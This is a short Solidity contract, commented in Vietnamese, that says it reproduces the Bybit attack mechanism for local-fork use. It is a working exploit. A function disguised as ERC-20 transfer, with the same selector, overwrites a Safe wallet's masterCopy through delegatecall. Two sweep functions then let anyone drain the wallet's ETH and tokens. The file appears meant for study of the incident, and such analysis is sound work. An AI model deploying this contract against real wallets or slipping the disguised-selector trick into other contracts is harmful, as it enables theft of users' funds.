// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/// @notice Contract tối giản minh hoạ cơ chế tấn công Bybit (chỉ dùng trên fork cục bộ).
/// Khi Safe delegatecall vào transfer(), biến slot0 nằm ở storage slot 0
/// của CHÍNH Safe, tức là masterCopy → bị ghi đè.
contract MaliciousImpl {
    address public slot0; // trùng vị trí với masterCopy của Safe

    /// Ngụy trang: selector 0xa9059cbb giống hệt ERC-20 transfer
    function transfer(
        address recipient,
        uint256 /* amount */
    )
        external
    {
        slot0 = recipient;
    }

    /// Sau khi Safe trỏ sang contract này, bất kỳ ai cũng gọi được để rút tài sản
    function sweepETH(address payable to) external {
        to.transfer(address(this).balance);
    }

    function sweepERC20(address token, address to) external {
        IERC20(token).transfer(to, IERC20(token).balanceOf(address(this)));
    }
}

